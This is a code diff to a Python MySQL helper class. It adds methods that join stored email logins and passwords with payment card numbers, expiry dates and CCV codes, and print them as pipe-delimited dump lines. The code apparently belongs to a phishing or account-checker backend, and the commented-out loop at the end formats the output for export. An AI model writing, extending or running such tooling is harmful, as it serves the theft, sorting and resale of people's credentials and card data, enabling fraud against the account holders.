@@ -27,7 +27,36 @@ class MySQLDatabase:
         self.cursor.execute(query, (account, password))
         self.connection.commit()
         pass
+    def analysis_id_scusess(self):
+        query = "SELECT m.user , m.password, p.card_number, p.`day`, p.`year`, p.ccv FROM mail m INNER JOIN pay p ON m.card_add = p.card_number"
+        self.cursor.execute(query)
+        result = self.cursor.fetchall()
+        print(result)
+        return result
+
+    def export_error_id(self, error):
+        query = None
+        if error == 'country':
+            query = "SELECT user, password, country FROM mail WHERE country IS NOT NULL"
+            self.cursor.execute(query)
+        else:
+            query = "SELECT user, password FROM mail WHERE exception = %s"
+            self.cursor.execute(query, (error,))
+
+        result = self.cursor.fetchall()
+        print(result)
+        return result
     
 
     def close(self):
         self.connection.close()
+        
+# db_intance = MySQLDatabase()
+# for data in db_intance.export_error_id("country"):
+#     try:
+#         print(data[0] + '|' + data[1] + '|' +data[2])
+#     except:
+#         print(data[0] + '|' + data[1] + "|UnLock")
+        
+# for data in db_intance.analysis_id_scusess():
+#     print(data[0]+'|'+data[1]+'|'+data[2]+'|'+data[3]+'|'+data[4]+'|'+data[5])
